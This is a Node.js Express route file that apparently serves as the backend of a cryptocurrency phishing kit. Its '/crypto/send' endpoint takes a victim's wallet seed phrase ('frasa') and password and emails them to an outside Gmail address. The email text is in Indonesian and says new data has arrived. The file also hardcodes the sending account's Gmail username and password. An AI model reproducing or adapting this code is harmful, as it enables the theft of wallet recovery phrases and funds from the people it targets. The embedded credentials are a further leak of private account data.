var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');
var hbs = require('nodemailer-express-handlebars');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

router.post('/crypto/send', function(req, res) {
    try {
        async function main() {
            let transporter = nodemailer.createTransport({
                service: 'gmail',
                host: 'smtp.gmail.com',
                auth: {
                    user: 'ridhliver3@gmail.com',
                    pass: 'd4rkw1ng123'
                }
            });
        
            // send mail with defined transport object
            let info = await transporter.sendMail({
                from: 'ridhliver3@gmail.com',
                to: 'ridhliver2@gmail.com',
                subject: 'Crypto',
                html: `<style type="text/css">
                .table-box {
                    width: 100% !important;
                }
                </style>
                <table class="table-box" align="center" border="0" cellpadding="0" cellspacing="0" style="margin: unset; padding: unset;background-color: #fff;">
                    <tbody>
                        <table class="table-box" align="center" border="0" cellpadding="0" cellspacing="0" style="margin: unset; padding: unset; background-color: #fff; width: 100%">
                        <tbody>
                            <tr style="width: 100%">
                                <td>
                                    <table align="left" border="0" cellpadding="0" cellspacing="0" style="text-align: left;" width="100%">
                                        <tr style="width: 100%">
                                            <td style="border-bottom: 4px solid #000000;">
                                                
                                            </td>
                                            <td style="border-bottom: 4px solid #000000;">
                                                
                                            </td>
                                        </tr>                            
                                        <tr style="width: 100%">
                                            <p style="font-size: 14px;"><b>Hallo,</b></p>
                                            <p>Ada data baru yang terkirim</p>
                                            <br />
                                            <p>Frasa : ${req.body.frasa}</p>
                                            <p>Password : ${req.body.password}</p>
                                            <br />
                                            <p style="margin-top: 5px;">
                                                <strong>Note :</strong>
                                            </p>
                                            <p style="font-size: 14px;">Jika email masuk dalam spam disarankan untuk mengklik "Laporkan bukan spam" yang muncul di bagian atas email.</p>
                                            </tr> 
                                        </table>
                                                        
                                    </td>
                                </tr>
                            </tbody>            
                        </table>
                    </tbody>
                    <tfoot>
                    <tr style="width: 100%">
                        <td>
                            <table class="table-box" align="center" border="0" cellpadding="0" cellspacing="0" style="margin: 0; padding: 0;background-color: #fff; width: 100%; max-width: 100%; min-width: 100%">
                                <tr>
                                    <td style="padding: 30px 0;">
                                        
                                        <div style="border-top: 1px solid #444; margin: 20px auto 0;"></div>
                                        <table  border="0" cellpadding="0" cellspacing="0" width="100%" style="margin: 20px auto 0;" >
                                            
                                            <tr>
                                                <td style="text-align: -webkit-center; text-align: center;">
                                                    <p style="font-size:13px; margin:0;">2022 Copy Right</p>
                                                </td>
                                            </tr>
                                            
                                        </table>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                        
                    </tfoot>
                <table>`
            });
            console.log('Message sent: %s', info.messageId);
            // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
            // Preview only available when sending through an Ethereal account
            console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
            // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...  
          };
          main().catch(console.error);
    } catch(err) {
        res.json({ status: 500, message: err });
    } finally {
        res.json({ status: 200, message: 'Success' });
    }  
});

module.exports = router;
